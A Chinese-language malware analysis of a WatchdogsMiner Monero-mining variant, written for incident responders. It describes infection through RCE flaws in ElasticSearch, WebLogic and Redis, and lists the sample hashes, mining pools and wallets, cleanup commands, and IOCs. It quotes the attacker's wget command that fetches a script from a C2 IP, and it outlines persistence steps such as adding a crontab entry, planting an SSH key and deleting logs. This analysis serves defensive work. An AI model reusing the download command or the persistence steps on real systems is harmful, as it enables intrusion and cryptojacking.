## **一、背景**

2020年9月23日，捕获到一起挖矿木马行为，通过分析，定性为针对“门罗币”的WatchdogsMiner变种挖矿木马入侵事件，一个求生欲望很强的Linux挖矿病毒家族，其采用了多种方式隐藏以及持久化攻击，该样本会访问。

攻击者利用ElasticSearch命令执行漏洞，在未授权的情况下远程执行代码，执行java程序执行wget命令下载shell脚本，该挖矿脚本组件，里更新了查杀更多家族的挖矿木马的脚本，如果运用得当，可改写为多版本挖矿木马的查杀工具。本文对WatchdogsMiner挖矿木马核心代码进行分析，便于从事安全事件响应的同行碰到相同类型的挖矿木马可以快速排查，定性安全威胁事件。

相较于过去发现的挖矿病毒，这次的挖矿病毒隐藏性更高，也更难被清理。服务器被该病毒入侵后将严重影响业务正常运行甚至导致奔溃，给企业带来不必要的损失。

攻击日志：

![](https://image.3001.net/images/20201008/1602123577_5f7e77393850a49fd6f49.png!small)攻击者试图在被攻击服务器上执行如下命令：

    
    
    wget http://185.181.10.234/E5DB0E07C3D7BE80V520/init.sh -P /tmp/sssooo

## 二、入侵分析

经过对捕获的事件进行分析，我们发现整个入侵流程大概是包含以下几个环节：

![](https://image.3001.net/images/20201008/1602123599_5f7e774f063c6abec2ff2.png!small)

1、扫描开放9200、8080、8088、6380、6379、7001、7002、1433端口的Linux服务器（后续扫描9126个ip）

2、通过ElasticSearch（9200）、weblogic（7001/7002）、redis（6379/6380）、MSSQL（1433）
、hadoop（8088）、apache（8080）命令执行漏洞init.sh修改为/tmp/sssooo，然后执行母体脚本，将下载执行母体脚本的动作写入crontab任务

3、通过脚本实现以上的相关行为，完成植入并启动挖矿程序

4、然后以守护进程的方式进行挖矿，挖矿的币种为门罗币。

微步分析网络行为：

![](https://image.3001.net/images/20201008/1602123887_5f7e786f7d7b13b4eb3a3.png!small)

## 三 样本介绍

样本基本信息：

 **样本**

|

 **MD5**

|

 **内容**  
  
---|---|---  
  
update.sh

|

4cc8f97c2bf9cbabb2c2be292886212a

|

挖矿母体脚本  
  
sysupdate

|

149c79bf71a54ec41f6793819682f790

|

64位挖矿程序  
  
config.json

|

c8325863c6ba60d62729decdde95c6fb

|

挖矿配置文件  
  
networkservice

|

8e9957b496a745f5db09b0f963eba74e

|

漏洞利用木马  
  
sysguard

|

c31038f977f766eeba8415f3ba2c242c

|

64位挖矿程序  
  
## 四 **、样本分析**

攻击者利用ElasticSearch命令执行漏洞下载init.sh挖矿母体脚本，相较于老版本的WatchdogsMiner样本，通过函数功能去实现排他功能，建立自己的根据地进程牟利，代码可读性更强了。脚本内容如下：

（1）首先关闭SElinux防火墙，更改系统默认命令，指定挖矿木马链接和文件大小，防止文件被改动；

![](https://image.3001.net/images/20201008/1602124132_5f7e79646d7dbf0bb9efe.png!small)（2）结束其他挖矿进程函数；

![](https://image.3001.net/images/20201008/1602124166_5f7e7986677693b646a49.png!small)

（3）下载挖矿木马函数；

![](https://image.3001.net/images/20201008/1602124209_5f7e79b139dab856351a2.png!small)（4）清理非sysguard|update.sh|sysupdate|networkservice进程函数；

![](https://image.3001.net/images/20201008/1602124236_5f7e79cccc9a985159360.png!small)（5）在crontab添加母体脚本下载和执行定时任务，添加攻击者主机的ssh密钥，下载挖矿配置文件和挖矿程序；

![](https://image.3001.net/images/20201008/1602124261_5f7e79e5df4b566b75113.png!small)（6）配置防火墙，查杀Stratum矿池协议的挖矿进程，使得自己独占CPU资源，删除行为日志。

###
![](https://image.3001.net/images/20201008/1602124282_5f7e79fad6f165fef52de.png!small)4.1
XMR挖矿信息如下

矿池地址：xmr.f2pool.com:13531

用户名：43zqYTWj1JG1H1idZFQWwJZLTos3hbJ5iR3tJpEtwEi43UBbzPeaQxCRysdjYTtdc8aHao7csiWa5BTP9PfNYzyfSbbrwoR.1130

密码：x

矿池地址：xmr-eu2.nanopool.org:14444

用户名：

43zqYTWj1JG1H1idZFQWwJZLTos3hbJ5iR3tJpEtwEi43UBbzPeaQxCRysdjYTtdc8aHao7csiWa5BTP9PfNYzyfSbbrwoR.1130

密码：x

矿池地址：randomxmonero.hk.nicehash.com:3380

用户名：

3HVQkSGfvyyQ8ACpShBhegoKGLuTCMCiAr.1130

密码：x

![](https://image.3001.net/images/20201008/1602124357_5f7e7a45158b5ebfd8af5.png!small)Total
paid: 1.000075 XMR

### 4.2、networkservice分析

逆向分析networkservice样本发现该样本UPX加壳了。

![](https://image.3001.net/images/20201008/1602124475_5f7e7abb5bbd71fd9e11b.png!small)

脱壳之后分析，发现该样本尝试多个存在RCE漏洞的漏洞利用攻击，已覆盖更全面的RCE漏洞利用。

![](https://image.3001.net/images/20201008/1602138025_5f7eafa93ef83a416533e.png!small)

分析TCP流量，发现该样本通过ElasticSearch（9200）、weblogic（7001/7002）、redis（6379/6380）、MSSQL（1433）
、hadoop（8088）、apache（8080）命令执行漏洞下载挖矿脚本，进行牟利。

![](https://image.3001.net/images/20201008/1602138060_5f7eafccd107a37febf72.png!small)

##  **五、解决方案**

1、手动清除挖矿木马，删除病毒体rm -rf /tmp/sysupdate,rm /tmp/networkservice,
/tmp/sysguard,/tmp/update.sh, /tmp/config.json

2、清理定时任务/usr/bin/crontab

3、查杀挖矿进程，ps auxf|grep -v grep|grep "sysupdate"|awk '{print $2}'|xargs kill
-9，ps auxf|grep -v grep|grep " networkservice"|awk '{print $2}'|xargs kill
-9，ps auxf|grep -v grep|grep " sysguard"|awk '{print $2}'|xargs kill -9

4、清除开启自启动服务chkconfig --del in

5、修复生产环境中RCE的漏洞。

##  **六、相关** **IOC**

 **MD5**

> 4cc8f97c2bf9cbabb2c2be292886212a
>
> 149c79bf71a54ec41f6793819682f790
>
> c8325863c6ba60d62729decdde95c6fb
>
> 8e9957b496a745f5db09b0f963eba74e
>
> c31038f977f766eeba8415f3ba2c242c

 **C2**

> 185.181.10.234

 **Domain**

> de.gsearch.com.de

